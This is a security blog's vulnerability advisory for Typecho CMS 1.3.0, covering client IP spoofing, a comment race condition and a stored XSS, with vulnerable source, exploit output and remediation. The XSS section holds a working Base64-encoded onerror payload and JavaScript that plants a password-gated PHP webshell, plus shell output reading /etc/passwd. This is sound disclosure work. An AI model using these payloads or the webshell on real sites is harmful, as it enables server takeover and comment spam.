








<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>cyberaz0r Security Blog | Typecho Multiple Vulnerabilities </title>
    <meta name="theme-color" content="#222222"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/assets/js/jquery.min.js"></script>
    <script src="/assets/js/popper.min.js"></script>
    <script src="/assets/js/bootstrap4.min.js"></script>
    <script src="/assets/js/header.js"></script>
    <script src="/assets/css/svg-with-js/js/fontawesome-all.js"></script>
    <link href="/assets/css/bootstrap4.min.css" rel="stylesheet">
    <link href="/assets/css/theme.css" rel="stylesheet">
    <link href="/assets/css/syntax.css" rel="stylesheet">
 </head>

<body>






<script type="text/javascript">
    WebFontConfig = {
        google: {
            families: ['Ubuntu::latin']
        }
    };
    (function () {
        var wf = document.createElement('script');
        wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
            '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
        wf.type = 'text/javascript';
        wf.async = 'true';
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(wf, s);
    })();
</script>

<nav class="navbar navbar-expand-lg fixed-top navbar-dark">
    <div class="container">
        <a class="navbar-brand" href="/">cyberaz0r Security Blog</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse"
                data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup"
                aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
            <div class="navbar-nav">
                <a class="nav-item nav-link" href="/">/home</a>
                <a class="nav-item nav-link" href="/archive">/archive</a>
                <a class="nav-item nav-link" href="/tags">/tags</a>
                <a class="nav-item nav-link" href="/about">/about</a>
            </div>
        </div>
    </div>
</nav>

    <div class="wrapper">
      <div class="content">
        <div class="container container-center">
          <div class="row">
            <div class="col-md-8 offset-md-1">
              <div class="article">
                <div class="card">
                  <h1><a href="/2024/08/typecho-multiple-vulnerabilities/">Typecho Multiple Vulnerabilities</a></h1>
                  <div class="post-meta">
                    <div class="post-time">
                      <i class="fa fa-calendar-alt"></i>
                      <time>18 Aug 2024</time>
                    </div>
                    <ul>
                      
                        <li><a href="/tag/cve-advisories">cve-advisories</a></li>
                      
                        <li><a href="/tag/CVE-2024-35538">CVE-2024-35538</a></li>
                      
                        <li><a href="/tag/CVE-2024-35539">CVE-2024-35539</a></li>
                      
                        <li><a href="/tag/CVE-2024-35540">CVE-2024-35540</a></li>
                      
                    </ul>
                  </div>
                  <div class="post-content">
                    
                    <p><img src="/assets/images/typecho-logo.png" alt="Typecho logo" /></p>

<h1 id="cve-2024-35538-client-ip-spoofing">CVE-2024-35538: Client IP Spoofing</h1>

<p><strong>Affected Products and Versions</strong>: Typecho CMS &lt;= 1.3.0<br />
<strong>CVSSv3.1 Score:</strong> 6.5 (Medium)<br />
<strong>CVSSv3.1 Attack Vector:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L<br />
<strong>Discoverer:</strong> Michele ‘cyberaz0r’ Di Bonaventura<br />
<strong>Exploit:</strong> <a href="https://raw.githubusercontent.com/cyberaz0r/Typecho-Multiple-Vulnerabilities/main/CVE-2024-35538.go">GitHub</a></p>

<h2 id="executive-summary">Executive Summary</h2>
<p>In Typecho v1.3.0 there is a Client IP Spoofing vulnerability, which allows malicious actors to falsify their IP addresses by specifying an arbitrary IP as value of “X-Forwarded-For” or “Client-Ip” headers while performing HTTP requests.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The vulnerability originates from the “var/Typecho/Request.php” file of the source code, in which the “getIp()” function is defined. This function returns the client IP address, which is retrieved via request headers such as “X-Forwarded-For” or “Client-Ip”, as shown in the following snippet.</p>

<blockquote class="filename">
  <p>var/Typecho/Request.php</p>
</blockquote>

<figure class="highlight"><pre><code class="language-php" data-lang="php">    <span class="k">public</span> <span class="k">function</span> <span class="n">getIp</span><span class="p">():</span> <span class="kt">string</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="kc">null</span> <span class="o">===</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ip</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$header</span> <span class="o">=</span> <span class="nb">defined</span><span class="p">(</span><span class="s1">'__TYPECHO_IP_SOURCE__'</span><span class="p">)</span> <span class="o">?</span> <span class="nb">__TYPECHO_IP_SOURCE__</span> <span class="o">:</span> <span class="s1">'X-Forwarded-For'</span><span class="p">;</span>
            <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getHeader</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getHeader</span><span class="p">(</span><span class="s1">'Client-Ip'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getServer</span><span class="p">(</span><span class="s1">'REMOTE_ADDR'</span><span class="p">)));</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ip</span><span class="p">))</span> <span class="p">{</span>
                <span class="p">[</span><span class="nv">$ip</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">'trim'</span><span class="p">,</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">));</span>
                <span class="nv">$ip</span> <span class="o">=</span> <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="no">FILTER_VALIDATE_IP</span><span class="p">,</span> <span class="no">FILTER_FLAG_IPV4</span> <span class="o">|</span> <span class="no">FILTER_FLAG_IPV6</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ip</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ip</span> <span class="o">=</span> <span class="nv">$ip</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ip</span> <span class="o">=</span> <span class="s1">'unknown'</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ip</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>This allows an attacker to bypass the IP-based comment spam protection, since it uses the aforementioned “getIp()” function to retrieve the client IP address, as shown in the following snippet of the “var/Widget/Feedback.php” file.</p>

<blockquote class="filename">
  <p>var/Widget/Feedback.php</p>
</blockquote>

<figure class="highlight"><pre><code class="language-php" data-lang="php">                    <span class="nv">$latestComment</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="nf">fetchRow</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="nf">select</span><span class="p">(</span><span class="s1">'created'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">from</span><span class="p">(</span><span class="s1">'table.comments'</span><span class="p">)</span>
                        <span class="o">-&gt;</span><span class="nf">where</span><span class="p">(</span><span class="s1">'cid = ? AND ip = ?'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">content</span><span class="o">-&gt;</span><span class="n">cid</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="nf">getIp</span><span class="p">())</span>
                        <span class="o">-&gt;</span><span class="nf">order</span><span class="p">(</span><span class="s1">'created'</span><span class="p">,</span> <span class="nc">Db</span><span class="o">::</span><span class="no">SORT_DESC</span><span class="p">)</span>
                        <span class="o">-&gt;</span><span class="nf">limit</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span></code></pre></figure>

<p>Consequently, an attacker can leverage the vulnerability to perform massive comment spamming to a post’s comment section of the application.</p>

<p>The following example shows a spam attack performed by executing the <a href="https://raw.githubusercontent.com/cyberaz0r/Typecho-Multiple-Vulnerabilities/main/CVE-2024-35538.go">exploit</a> on a test environment for 60 seconds.</p>
<blockquote class="filename">
  <p>Exploit output</p>
</blockquote>

<figure class="highlight"><pre><code class="language-raw" data-lang="raw">$ go run CVE-2024-35538.go http://172.17.0.2/index.php/archives/41/
[+] Starting Typecho &lt;= 1.3.0 Client IP Spoofing exploit (CVE-2024-35538) by cyberaz0r
[+] Spam target: http://172.17.0.2/index.php/archives/41/
[*] Getting JavaScript function to calculate form token...
[*] Evaluating JavaScript function to calculate form token...
[+] Form token: f7497108c28cf342a1525b60b79eb14e
[*] Spamming comment 5131 from 0.0.20.10</code></pre></figure>

<p>The following screenshot illustrates the result of the attack, in which it is possible to notice that the attacker was able to post 5145 comments in 60 seconds.</p>

<p><img src="/assets/images/typecho-1.png" alt="img" class="center-image" /><em>Result of the spam attack: 5145 comments posted in 60 seconds</em></p>

<h2 id="remediation">Remediation</h2>
<p>Update Typecho CMS to the latest version.</p>

<h2 id="references">References</h2>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-35538">https://nvd.nist.gov/vuln/detail/CVE-2024-35538</a><br />
<a href="https://github.com/typecho/typecho">https://github.com/typecho/typecho</a><br />
<a href="https://github.com/typecho/typecho/blob/master/var/Typecho/Request.php">https://github.com/typecho/typecho/blob/master/var/Typecho/Request.php</a><br />
<a href="https://github.com/typecho/typecho/blob/master/var/Widget/Feedback.php">https://github.com/typecho/typecho/blob/master/var/Widget/Feedback.php</a><br />
<a href="https://typecho.org">https://typecho.org</a></p>

<h1 id="cve-2024-35539-race-condition">CVE-2024-35539: Race Condition</h1>

<p><strong>Affected Products and Versions</strong>: Typecho CMS &lt;= 1.3.0<br />
<strong>CVSSv3.1 Score:</strong> 4.8 (Medium)<br />
<strong>CVSSv3.1 Attack Vector:</strong> AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L<br />
<strong>Discoverer:</strong> Michele ‘cyberaz0r’ Di Bonaventura<br />
<strong>Exploit:</strong> <a href="https://raw.githubusercontent.com/cyberaz0r/Typecho-Multiple-Vulnerabilities/main/CVE-2024-35539.go">GitHub</a></p>

<h2 id="executive-summary-1">Executive Summary</h2>
<p>In Typecho v1.3.0 there is a Race Condition vulnerability in the post commenting functionality, which allows an attacker to post several comments before the spam protection checks if the comments are posted too frequently.</p>

<h2 id="proof-of-concept-1">Proof of Concept</h2>
<p>The vulnerability originates from the “var/Widget/Feedback.php” file of the source code, in which the comment spam protection is implemented. Specifically, the application rejects all new comments of a user that commented within a specified time frame, as shown in the following snippet.</p>

<blockquote class="filename">
  <p>var/Widget/Feedback.php</p>
</blockquote>

<figure class="highlight"><pre><code class="language-php" data-lang="php">                    <span class="k">if</span> <span class="p">(</span>
                        <span class="nv">$latestComment</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="o">-&gt;</span><span class="n">time</span> <span class="o">-</span> <span class="nv">$latestComment</span><span class="p">[</span><span class="s1">'created'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
                            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="o">-&gt;</span><span class="n">time</span> <span class="o">-</span> <span class="nv">$latestComment</span><span class="p">[</span><span class="s1">'created'</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="o">-&gt;</span><span class="n">commentsPostInterval</span><span class="p">)</span>
                    <span class="p">)</span> <span class="p">{</span>
                        <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="nf">_t</span><span class="p">(</span><span class="s1">'对不起, 您的发言过于频繁, 请稍侯再次发布.'</span><span class="p">),</span> <span class="mi">403</span><span class="p">);</span>
                    <span class="p">}</span></code></pre></figure>

<p>However, it is still possible to post multiple comments within the time range that is not included in the time frame, as demonstrated in the following example.</p>

<p><img src="/assets/images/typecho-2.png" alt="img" class="center-image" /><em>Multiple comments posted in the excluded time range</em></p>

<p>In particular, the spam protection mechanism stops the comment spam attack for 60 seconds, but allows continuing it within the second from a time range to another, as shown below.</p>

<p><img src="/assets/images/typecho-3.png" alt="img" class="center-image" /><em>Time frames not covered by the protection</em></p>

<p>The following example shows a spam attack performed by executing the <a href="https://raw.githubusercontent.com/cyberaz0r/Typecho-Multiple-Vulnerabilities/main/CVE-2024-35539.go">exploit</a> on a test environment for 60 seconds.</p>
<blockquote class="filename">
  <p>Exploit output</p>
</blockquote>

<figure class="highlight"><pre><code class="language-raw" data-lang="raw">$ go run CVE-2024-35539.go http://172.17.0.2/index.php/archives/42/
[+] Starting Typecho &lt;= 1.3.0 Race Condition exploit (CVE-2024-35539) by cyberaz0r
[+] Spam target: http://172.17.0.2/index.php/archives/42/
[*] Getting JavaScript function to calculate form token...
[*] Evaluating JavaScript function to calculate form token...
[+] Form token: 4ab366d5882fc57013b2eca11e40d07f
[*] Spamming comment request 997    
[+] Successfully spammed 1000 comments
[*] Waiting for next spam wave... (0 seconds)     
[*] Spamming comment request 682    
[+] Successfully spammed 2000 comments</code></pre></figure>

<p>The following screenshot illustrates the result of the attack, in which it is possible to notice that the attacker was able to post 2000 comments in 60 seconds.</p>

<p><img src="/assets/images/typecho-4.png" alt="img" class="center-image" /><em>Result of the spam attack: 2000 comments posted in 60 seconds</em></p>

<h2 id="remediation-1">Remediation</h2>
<p>Update Typecho CMS to the latest version.</p>

<h2 id="references-1">References</h2>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-35539">https://nvd.nist.gov/vuln/detail/CVE-2024-35539</a><br />
<a href="https://github.com/typecho/typecho">https://github.com/typecho/typecho</a><br />
<a href="https://github.com/typecho/typecho/blob/master/var/Widget/Feedback.php">https://github.com/typecho/typecho/blob/master/var/Widget/Feedback.php</a><br />
<a href="https://typecho.org">https://typecho.org</a></p>

<h1 id="cve-2024-35540-stored-cross-site-scripting-xss">CVE-2024-35540: Stored Cross-Site Scripting (XSS)</h1>

<p><strong>Affected Products and Versions</strong>: Typecho CMS &lt;= 1.3.0<br />
<strong>CVSSv3.1 Score:</strong> 7.6 (High)<br />
<strong>CVSSv3.1 Attack Vector:</strong> AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:H/A:H<br />
<strong>Discoverer:</strong> Michele ‘cyberaz0r’ Di Bonaventura<br />
<strong>Exploit:</strong> <a href="https://raw.githubusercontent.com/cyberaz0r/Typecho-Multiple-Vulnerabilities/main/CVE-2024-35540.go">GitHub</a></p>

<h2 id="executive-summary-2">Executive Summary</h2>
<p>In Typecho v1.3.0 there is a Stored Cross-Site Scripting vulnerability in the post writing functionality, which allows an attacker with post writing privileges to inject arbitrary JavaScript code inside the preview of a post.</p>

<h2 id="proof-of-concept-2">Proof of Concept</h2>
<p>In the following attack scenario, an authenticated attacker with “contributor” role will weaponize the vulnerability to perform a privilege escalation. Specifically, an attacker with “contributor” role stores a malicious payload inside the preview page and deceives an administrator user to visit such page, in order to edit the PHP code of the application to backdoor the system in which the application is running.</p>

<p>The following JavaScript code is used to weaponize the XSS vulnerability to edit the PHP code of the application.</p>
<blockquote class="filename">
  <p>Javascript</p>
</blockquote>

<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="s2">`
	header("X-Random-Token: " . md5(uniqid()));
	if (isset($_POST["CSRFToken"]) &amp;&amp; $_POST["CSRFToken"] === "569d197b87a4d58dbc24ce41ce39c995ffeba093da0301a509662a152d827a88") {
		if (isset($_POST["action"])) {
			system($_POST["action"]);
			exit;
		}
	}
`</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">i</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">protocol</span><span class="o">+</span><span class="dl">'</span><span class="s1">//</span><span class="dl">'</span><span class="o">+</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span><span class="o">+</span><span class="dl">'</span><span class="s1">/admin/theme-editor.php</span><span class="dl">'</span><span class="p">;</span>
<span class="nx">i</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">none</span><span class="dl">'</span><span class="p">;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>

<span class="nx">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="kd">var</span> <span class="nx">textarea</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">content</span><span class="dl">'</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="nx">textarea</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">payload</span><span class="p">))</span>
		<span class="k">return</span><span class="p">;</span>

	<span class="nx">textarea</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">textarea</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;</span><span class="se">\?</span><span class="sr">php/</span><span class="p">,</span> <span class="dl">'</span><span class="s1">&lt;?php </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">);</span>

	<span class="kd">var</span> <span class="nx">form</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">theme</span><span class="dl">'</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
<span class="p">},</span> <span class="mi">200</span><span class="p">);</span></code></pre></figure>

<p>The aforementioned code then, is converted into Base64 and inserted into the following payload, which will be stored in the body of a post through the “text” HTTP POST parameter of the request fired to the endpoint “/index.php/action/contents-post-edit” for writing a post.</p>
<blockquote class="filename">
  <p>Payload</p>
</blockquote>

<figure class="highlight"><pre><code class="language-html" data-lang="html">[<span class="nt">&lt;img</span> <span class="na">style=</span><span class="s">"display:none"</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">"eval(atob('dmFyIHBheWxvYWQgPSBgCgloZWFkZXIoIlgtUmFuZG9tLVRva2VuOiAiIC4gbWQ1KHVuaXFpZCgpKSk7CglpZiAoaXNzZXQoJF9QT1NUWyJDU1JGVG9rZW4iXSkgJiYgJF9QT1NUWyJDU1JGVG9rZW4iXSA9PT0gIjU2OWQxOTdiODdhNGQ1OGRiYzI0Y2U0MWNlMzljOTk1ZmZlYmEwOTNkYTAzMDFhNTA5NjYyYTE1MmQ4MjdhODgiKSB7CgkJaWYgKGlzc2V0KCRfUE9TVFsiYWN0aW9uIl0pKSB7CgkJCXN5c3RlbSgkX1BPU1RbImFjdGlvbiJdKTsKCQkJZXhpdDsKCQl9Cgl9CmA7CnZhciBpID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaWZyYW1lJyk7Cmkuc3JjID0gbG9jYXRpb24ucHJvdG9jb2wrJy8vJytsb2NhdGlvbi5ob3N0KycvYWRtaW4vdGhlbWUtZWRpdG9yLnBocCc7Cmkuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpKTsKCnNldFRpbWVvdXQoKCkgPT4gewoJdmFyIHRleHRhcmVhID0gaS5jb250ZW50V2luZG93LmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb250ZW50Jyk7CglpZiAodGV4dGFyZWEudmFsdWUuaW5jbHVkZXMocGF5bG9hZCkpCgkJcmV0dXJuOwoKCXRleHRhcmVhLnZhbHVlID0gdGV4dGFyZWEudmFsdWUucmVwbGFjZSgvPFw/cGhwLywgJzw/cGhwICcgKyBwYXlsb2FkKTsKCgl2YXIgZm9ybSA9IGkuY29udGVudFdpbmRvdy5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGhlbWUnKS5zdWJtaXQoKTsKfSwgMjAwKTsK'))"</span><span class="nt">&gt;</span>][1]
[1]: https://google.com</code></pre></figure>

<p>Upon a visit from the administrator user to the preview page of the malicious post, the aforementioned JavaScript code will be reflected and executed, resulting in editing the PHP code of the application on the administrator’s behalf, allowing an attacker to remotely execute arbitrary shell commands on the system hosting the webapp.</p>

<p>The following example shows this attack scenario performed by executing the <a href="https://raw.githubusercontent.com/cyberaz0r/Typecho-Multiple-Vulnerabilities/main/CVE-2024-35540.go">exploit</a> on a test environment.</p>
<blockquote class="filename">
  <p>Exploit output</p>
</blockquote>

<figure class="highlight"><pre><code class="language-raw" data-lang="raw">$ go run CVE-2024-35540.go http://172.17.0.2 "a2a379b8590d3431d7153bb3b68da0df__typecho_uid=2; a2a379b8590d3431d7153bb3b68da0df__typecho_authCode=%24T%24zrjz7TpeIdce8b06d7ab42a6cb4b9a178367d6e41; PHPSESSID=75c8f8b629bda78fabadda2bdf41ebcf"
[+] Starting Typecho &lt;= 1.3.0 Stored XSS exploit (CVE-2024-35540) by cyberaz0r
[*] Getting post edit URL with CSRF token...
[+] Edit URL: http://172.17.0.2/index.php/action/contents-post-edit?_=af80aafb169d0740d2e560d5afeaa581
[+] Generated password to access the webshell:  c8cdbb510e182ccedd02e6a42c71398f5951672fe93d9bea1decf94c14f0f2c4
[*] Generating JavaScript code to inject webshell...
[*] Creating malicious post...
[+] Malicious post created successfully!
[i] Send this preview URL to the admin to trigger the XSS:
http://172.17.0.2/admin/preview.php?cid=33
[*] Waiting for the admin to visit the preview URL...
[+] Webshell injected successfully!
[+] Enjoy your shell ;)

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ whoami
www-data

$ hostname
af168ce4397f

$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false

$ ls -lahF
total 88K
drwxr-xr-x 6 www-data www-data 4.0K Aug 14 23:34 ./
drwxr-xr-x 1 root     root     4.0K Aug 14 23:23 ../
-rw-r--r-- 1 root     root      140 May  3 01:37 .htaccess
drwxr-xr-x 5 www-data www-data 4.0K Aug 14 23:23 admin/
-rw-r--r-- 1 www-data www-data  809 Aug 14 23:34 config.inc.php
-rw-r--r-- 1 www-data www-data  708 Aug 14 23:23 index.php
drwxr-xr-x 2 www-data www-data 4.0K Aug 14 23:23 install/
-rw-r--r-- 1 www-data www-data  50K Aug 14 23:23 install.php
drwxr-xr-x 6 www-data www-data 4.0K Aug 14 23:23 usr/
drwxr-xr-x 6 www-data www-data 4.0K Aug 14 23:23 var/</code></pre></figure>

<p>The following screenshot illustrates the preview page of the malicious post, visited by the administrator to trigger the payload.</p>

<p><img src="/assets/images/typecho-5.png" alt="img" class="center-image" /><em>Preview page of the malicious post visited by the administrator user</em></p>

<p>As a result, the PHP code of the application has been backdoored, as demonstrated in the following screenshot.</p>

<p><img src="/assets/images/typecho-6.png" alt="img" class="center-image" /><em>PHP code of the application successfully backdoored</em></p>

<h2 id="remediation-2">Remediation</h2>
<p>Update Typecho CMS to the latest version.</p>

<h2 id="references-2">References</h2>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-35540">https://nvd.nist.gov/vuln/detail/CVE-2024-35540</a><br />
<a href="https://github.com/typecho/typecho">https://github.com/typecho/typecho</a><br />
<a href="https://typecho.org">https://typecho.org</a></p>

                    

<div class="share-bar">
  <ul class="share-buttons">
    
      <li class="share-facebook">
          <a href="https://www.facebook.com/sharer/sharer.php?u=https://cyberaz0r.info/2024/08/typecho-multiple-vulnerabilities/"
             target="_blank" title="Share on Facebook">
            <span class="fa-layers fa-fw fa-2x">
                <i class="far fa-square"></i>
                <i class="fab fa-facebook-f" data-fa-transform="shrink-8"></i>
            </span>
          </a>
      </li>
    

    
    <li class="share-twitter">
      <a href="https://twitter.com/intent/tweet?url=https://cyberaz0r.info/2024/08/typecho-multiple-vulnerabilities/&text=Typecho Multiple Vulnerabilities" target="_blank" title="Tweet">
        <span class="fa-layers fa-fw fa-2x">
            <i class="far fa-circle"></i>
            <i class="fab fa-twitter" data-fa-transform="shrink-8"></i>
        </span>
      </a>
    </li>
    

    

    
    <li class="share-linkedin">
      <a href="http://www.linkedin.com/shareArticle?mini=true&url=https://cyberaz0r.info/2024/08/typecho-multiple-vulnerabilities/&title=Typecho Multiple Vulnerabilities&summary=Advisory about Client IP Spoofing, Race Condition and Stored Cross-Site Scripting (XSS) found on Typecho CMS.&source=" target="_blank" title="Share on LinkedIn">
        <span class="fa-layers fa-fw fa-2x">
            <i class="far fa-circle"></i>
            <i class="fab fa-linkedin-in" data-fa-transform="shrink-8"></i>
        </span>
      </a>
    </li>
    

    
    <li class="share-pinterest">
      <a href="http://pinterest.com/pin/create/button/?urlhttps://cyberaz0r.info/2024/08/typecho-multiple-vulnerabilities/=&description=Advisory about Client IP Spoofing, Race Condition and Stored Cross-Site Scripting (XSS) found on Typecho CMS." target="_blank" title="Pin it">
        <span class="fa-layers fa-fw fa-2x">
            <i class="far fa-circle"></i>
            <i class="fab fa-pinterest-p" data-fa-transform="shrink-8"></i>
        </span>
      </a>
    </li>
    

    
    <li class="share-envelope">
      <a href="mailto:?&subject=Typecho Multiple Vulnerabilities&body=Advisory about Client IP Spoofing, Race Condition and Stored Cross-Site Scripting (XSS) found on Typecho CMS. https://cyberaz0r.info/2024/08/typecho-multiple-vulnerabilities/" target="_blank" title="Email">
        <span class="fa-layers fa-fw fa-2x">
            <i class="far fa-circle"></i>
            <i class="far fa-envelope" data-fa-transform="shrink-8"></i>
        </span>
      </a>
    </li>
    

  </ul>
</div>


                  </div>
                  
                </div>
              </div>
            </div>
            <div class="col-md-3 hidden-xs">
              <div class="sidebar ">
  <h2>Recent Posts</h2>
  <ul>
    
    <li><a href="/2024/08/typecho-multiple-vulnerabilities/">Typecho Multiple Vulnerabilities</a></li>
    
    <li><a href="/2023/11/glinet-multiple-vulnerabilities/">GL.iNet Multiple Vulnerabilities</a></li>
    
    <li><a href="/2023/06/released-iis-tilde-enumeration-scanner-2.0-for-hackinbo-security-conference/">Released IIS Tilde Enumeration Scanner 2.0 for HackInBo security conference</a></li>
    
    <li><a href="/2021/12/published-iis-tilde-enumeration-scanner-burp-extension/">Published IIS Tilde Enumeration Scanner Burp Suite extension</a></li>
    
    <li><a href="/2021/11/introducing-badmoodle-a-moodle-community-based-vulnerability-scanner/">Introducing badmoodle: a moodle community-based vulnerability scanner</a></li>
    
  </ul>
</div>

<div class="sidebar">
  <h2>Tags</h2>
  <ul class="fa-ul">
    
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/CVE-2020-12102" data-toggle="tooltip" data-placement="right" title="1">
        <span>CVE-2020-12102</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/CVE-2020-12103" data-toggle="tooltip" data-placement="right" title="1">
        <span>CVE-2020-12103</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/CVE-2021-36387" data-toggle="tooltip" data-placement="right" title="1">
        <span>CVE-2021-36387</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/CVE-2021-36388" data-toggle="tooltip" data-placement="right" title="1">
        <span>CVE-2021-36388</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/CVE-2021-36389" data-toggle="tooltip" data-placement="right" title="1">
        <span>CVE-2021-36389</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/CVE-2023-46454" data-toggle="tooltip" data-placement="right" title="1">
        <span>CVE-2023-46454</span></a></li>
    
    <li><span class="fa-li"><i class="fas fa-tag"></i></span>
            <a href="/tag/CVE-2023-46455" data-toggle="tooltip" data-placement="right" title="1">
        <span>CVE-2023-46455</span></a></li>
    
